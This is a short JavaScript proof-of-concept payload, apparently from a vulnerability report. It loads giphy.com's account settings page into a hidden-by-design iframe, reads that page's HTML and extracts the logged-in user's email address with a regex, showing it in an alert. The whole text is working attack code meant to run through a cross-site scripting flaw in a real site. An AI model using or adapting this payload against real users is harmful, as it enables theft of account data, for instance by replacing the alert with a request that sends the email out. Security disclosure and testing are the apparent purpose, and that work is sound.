setTimeout(function() {
    var profileIframe = document.createElement('iframe');
    profileIframe.setAttribute('src', 'https://giphy.com/settings/');
    profileIframe.setAttribute('id', 'pi');
    document.body.appendChild(profileIframe);
    //Extract their email as PoC
    profileIframe.onload = function() {
        var d = document.getElementById('pi').contentWindow.document.body.innerHTML;
        var matches = /value="([^"]+)" name="email"/.exec(d);
        alert(matches[1]);
    }
}, 9000);
